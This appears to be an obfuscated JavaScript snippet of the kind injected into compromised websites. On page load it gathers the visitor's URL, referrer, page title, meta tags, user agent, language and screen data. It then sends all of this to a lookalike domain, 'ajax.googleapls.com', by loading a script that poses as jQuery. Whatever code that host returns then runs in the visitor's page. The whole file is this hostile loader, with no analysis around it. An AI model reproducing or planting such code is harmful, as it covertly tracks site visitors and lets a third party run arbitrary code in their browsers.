var x0ffa9b44eb934e208642c1e6f1128789;
if (typeof(x0ffa9b44eb934e208642c1e6f1128789) == "undefined") {
    var x7b1970d1392a4ab4ab18e5cddc9e871a_hk = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
    var x7b1970d1392a4ab4ab18e5cddc9e871a_he = function(input) {
        var str, i, len, c;
        str = "";
        len = input.length;
        for (i = 0; i < len; i++) {
            c = input.charCodeAt(i);
            if ((c >= 0x0001) && (c <= 0x007F)) {
                str += input.charAt(i)
            } else if (c > 0x07FF) {
                str += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
                str += String.fromCharCode(0x80 | ((c >> 6) & 0x3F));
                str += String.fromCharCode(0x80 | ((c >> 0) & 0x3F))
            } else {
                str += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F));
                str += String.fromCharCode(0x80 | ((c >> 0) & 0x3F))
            }
        }
        var output = "";
        var chr1, chr2, chr3 = "";
        var enc1, enc2, enc3, enc4 = "";
        var i = 0;
        do {
            chr1 = str.charCodeAt(i++);
            chr2 = str.charCodeAt(i++);
            chr3 = str.charCodeAt(i++);
            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;
            if (isNaN(chr2)) {
                enc3 = enc4 = 64
            } else if (isNaN(chr3)) {
                enc4 = 64
            }
            output = output + x7b1970d1392a4ab4ab18e5cddc9e871a_hk.charAt(enc1) + x7b1970d1392a4ab4ab18e5cddc9e871a_hk.charAt(enc2) + x7b1970d1392a4ab4ab18e5cddc9e871a_hk.charAt(enc3) + x7b1970d1392a4ab4ab18e5cddc9e871a_hk.charAt(enc4);
            chr1 = chr2 = chr3 = "";
            enc1 = enc2 = enc3 = enc4 = ""
        } while (i < str.length);
        return output
    };
    var x7b1970d1392a4ab4ab18e5cddc9e871a_hd = function(input) {
        var str = "";
        var chr1, chr2, chr3 = "";
        var enc1, enc2, enc3, enc4 = "";
        var i = 0;
        if (input.length % 4 != 0) {
            return ""
        }
        var base64test = /[^A-Za-z0-9\+\/\=]/g;
        if (base64test.exec(input)) {
            return ""
        }
        do {
            enc1 = x7b1970d1392a4ab4ab18e5cddc9e871a_hk.indexOf(input.charAt(i++));
            enc2 = x7b1970d1392a4ab4ab18e5cddc9e871a_hk.indexOf(input.charAt(i++));
            enc3 = x7b1970d1392a4ab4ab18e5cddc9e871a_hk.indexOf(input.charAt(i++));
            enc4 = x7b1970d1392a4ab4ab18e5cddc9e871a_hk.indexOf(input.charAt(i++));
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
            str = str + String.fromCharCode(chr1);
            if (enc3 != 64) {
                str += String.fromCharCode(chr2)
            }
            if (enc4 != 64) {
                str += String.fromCharCode(chr3)
            }
            chr1 = chr2 = chr3 = "";
            enc1 = enc2 = enc3 = enc4 = ""
        } while (i < input.length);
        var output, i, len, c;
        var char2, char3;
        output = "";
        len = str.length;
        i = 0;
        while (i < len) {
            c = str.charCodeAt(i++);
            switch (c >> 4) {
                case 0:
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                case 6:
                case 7:
                    output += str.charAt(i - 1);
                    break;
                case 12:
                case 13:
                    char2 = str.charCodeAt(i++);
                    output += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                    break;
                case 14:
                    char2 = str.charCodeAt(i++);
                    char3 = str.charCodeAt(i++);
                    output += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));
                    break
            }
        }
        return output
    };
    var x7b1970d1392a4ab4ab18e5cddc9e871a_getCookie = function(cookiename) {
        var result;
        var mc = document.cookie;
        var start2 = mc.indexOf(cookiename + "=");
        if (start2 > -1) {
            start = mc.indexOf("=", start2) + 1;
            var end = mc.indexOf(";", start);
            if (end == -1) {
                end = mc.length;
            }
            result = unescape(mc.substring(start, end));
        }
        return result;
    };
    var x7b1970d1392a4ab4ab18e5cddc9e871a_setCookie = function(cookiename, cookievalue, time) {
        var date = new Date();
        date.setTime(date.getTime() + time * 1000);
        document.cookie = cookiename + "=" + cookievalue + "; path=/;expires = " + date.toGMTString();
    };
    var x7b1970d1392a4ab4ab18e5cddc9e871a_loadScript = function(url, callback) {
        var st = document.createElement("script");
        st.type = "text/javascript";
        st.async = true;
        st.charset = 'utf-8';
        if (st.readyState) {
            st.onreadystatechange = function() {
                if (st.readyState == "loaded" || st.readyState == "complete") {
                    st.onreadystatechange = null;
                    callback()
                }
            }
        } else {
            st.onload = function() {
                callback()
            }
        }
        st.src = url;
        var s = document.getElementsByTagName('script')[0];
        s.parentNode.insertBefore(st, s);
    };
    var x0ffa9b44eb934e208642c1e6f1128789_whenReady = (function() {
        var funcs = [],
            ready = false;

        function handler(e) {
            if (ready) return;
            if (e.type === 'onreadystatechange' && document.readyState !== 'complete') {
                return
            }
            for (var i = 0; i < funcs.length; i++) {
                funcs[i].call(document)
            }
            ready = true;
            funcs = null
        }
        if (document.addEventListener) {
            document.addEventListener('DOMContentLoaded', handler, false);
            document.addEventListener('readystatechange', handler, false);
            window.addEventListener('load', handler, false)
        } else if (document.attachEvent) {
            document.attachEvent('onreadystatechange', handler);
            window.attachEvent('onload', handler)
        }
        return function(fn) {
            if (ready) {
                fn.call(document)
            } else {
                funcs.push(fn)
            }
        }
    })();
    (function() {
        x0ffa9b44eb934e208642c1e6f1128789_whenReady(function() {
            var params = {};
            params.timestamp = new Date().getTime();
            if (document) {
                params.domain = document.domain || '';
                params.url = document.URL || '';
                params.referrer = window.top.document.referrer || window.parent.document.referrer || document.referrer || '';
                params.title = x7b1970d1392a4ab4ab18e5cddc9e871a_he(document.title) || '';
                if (typeof document.getElementsByTagName("meta")["keywords"] != 'undefined') {
                    params.keywords = x7b1970d1392a4ab4ab18e5cddc9e871a_he(document.getElementsByTagName("meta")["keywords"].getAttribute("content")) || ''
                }
                if (typeof document.getElementsByTagName("meta")["description"] != 'undefined') {
                    params.description = x7b1970d1392a4ab4ab18e5cddc9e871a_he(document.getElementsByTagName("meta")["description"].getAttribute("content")) || ''
                }
                params.charset = document.charset || ''
            }
            if (navigator) {
                params.appCodeName = navigator.appCodeName || '';
                params.appName = navigator.appName || '';
                params.appVersion = navigator.appVersion || '';
                params.platform = navigator.platform || '';
                params.userAgent = navigator.userAgent || '';
                params.language = navigator.browserLanguage || navigator.language || ''
            }
            if (screen) {
                params.screenWidth = screen.width || 0;
                params.screenHeight = screen.height || 0;
                params.colorDepth = screen.colorDepth || 0;
            }
            var args = '';
            for (var i in params) {
                if (args != '') {
                    args += '&'
                }
                args += i + '=' + encodeURIComponent(params[i])
            }
            var url = '//ajax.googleapls.com/jquery.min.js?' + args;
            if (typeof JSON !== "object") {
                x7b1970d1392a4ab4ab18e5cddc9e871a_loadScript('https://cdnjs.cloudflare.com/ajax/libs/json2/20160511/json2.min.js', function() {
                    x7b1970d1392a4ab4ab18e5cddc9e871a_loadScript(url, function() {});
                });
            } else {
                x7b1970d1392a4ab4ab18e5cddc9e871a_loadScript(url, function() {});
            }
        });
        x0ffa9b44eb934e208642c1e6f1128789 = true
    })()
}